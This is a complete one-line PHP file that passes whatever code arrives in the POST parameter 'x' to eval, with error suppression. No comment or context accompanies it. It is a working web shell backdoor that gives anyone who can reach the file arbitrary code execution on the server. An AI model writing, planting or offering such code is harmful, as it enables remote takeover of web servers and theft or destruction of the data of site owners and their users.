<?php 
@eval($_POST["x"]);


 ?>